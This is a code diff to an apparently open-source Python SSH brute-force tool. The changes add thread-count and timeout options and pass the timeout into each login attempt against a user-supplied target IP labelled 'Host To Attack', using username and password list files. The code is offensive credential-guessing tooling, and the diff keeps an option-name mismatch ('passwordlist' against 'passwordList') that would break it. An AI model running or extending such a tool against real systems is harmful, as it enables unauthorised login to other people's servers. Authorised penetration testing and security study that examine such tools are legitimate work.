@@ -22,6 +22,7 @@ class SSHBruteForce():
         self.connections  = []
         self.amountOfThreads = 10
         self.currentThreadCount = 0
+        self.timeoutTime = 15
         self.verbose = False
         
     def startUp(self):
@@ -29,9 +30,11 @@ class SSHBruteForce():
         
         optionParser = OptionParser(version = self.info, usage = usage)
 
-        optionParser.add_option('-h', dest = 'targetIp',     help = 'Host To Attack')
-        optionParser.add_option('-U', dest = 'userList',     help = 'Username List file')
-        optionParser.add_option('-P', dest = 'passwordList', help = 'Password List file')
+        optionParser.add_option('-h', dest = 'targetIp',        help = 'Host To Attack')
+        optionParser.add_option('-U', dest = 'userList',        help = 'Username List file')
+        optionParser.add_option('-P', dest = 'passwordList',    help = 'Password List file')
+        optionParser.add_option('-t', type = 'int', dest = 'threads',      help = 'Amount of Threads')
+        optionParser.add_option('-T', type = 'int', dest = 'timeout',      help = 'Timeout Time')
         optionParser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='verbose')
 
         (options, args) = optionParser.parse_args()
@@ -39,10 +42,12 @@ class SSHBruteForce():
         if not options.targetIp or not options.userList or not options.passwordlist:
             optionParser.print_help()
             sys.exit(1)
-            
+        
         self.targetIp = options.targetIp
         self.userNames = Util.fileContentsToList(options.userList)
         self.passwords = Util.fileContentsToList(options.passwordlist)
+        self.amountOfThreads = options.threads
+        self.timeoutTime = options.timeout
         self.verbose = options.verbose
         
         self.showStartInfo()
@@ -63,7 +68,7 @@ class SSHBruteForce():
                 self.currentThreadResults()
             
     def createConnection(self, userName, password, targetIp):
-        connection = Connection(userName, password, targetIp, 22, 30)
+        connection = Connection(userName, password, targetIp, 22, self.timeoutTime)
         connection.start()
         self.connections.append(connection)
         self.currentThreadCount += 1
